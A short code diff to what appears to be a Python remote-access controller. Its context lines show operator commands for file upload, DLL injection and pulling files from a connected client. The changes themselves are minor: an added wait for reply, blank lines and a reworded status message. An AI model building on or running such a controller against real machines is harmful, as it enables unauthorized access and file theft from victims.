@@ -625,6 +625,8 @@ Open Ports
                     filename = input("[+] File : ")
                     if(len(filename) > 0):
                         self.SendData("fupload:"+filename)
+                        self.WaitForReply()
+
                 elif(main == "dllinject"):
                     shellmode = True
                     DLLTransfer()
@@ -780,13 +782,15 @@ Open Ports
 
                         with open(FinalF, "wb") as incoming_file:
                             data = self.client_socket.recv(4096)
+                           
                             print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=filename, fd=FinalF))
                             while(len(data) != filesize):
                                 data += self.client_socket.recv(filesize - len(data))  
                                 #print("data = " + str(len(data)) + " filesize = " + str(filesize))
                                 if not data: break
                             incoming_file.write(data)
-                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloaded '{fl}' in '{fd}'".format(fl=filename, fd=FinalF))
+                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloaded '{fl}' => '{fd}'".format(fl=filename, fd=FinalF))
+                        
                     except Exception as e:
                         print("[X] Error : " + str(e))
                         pass
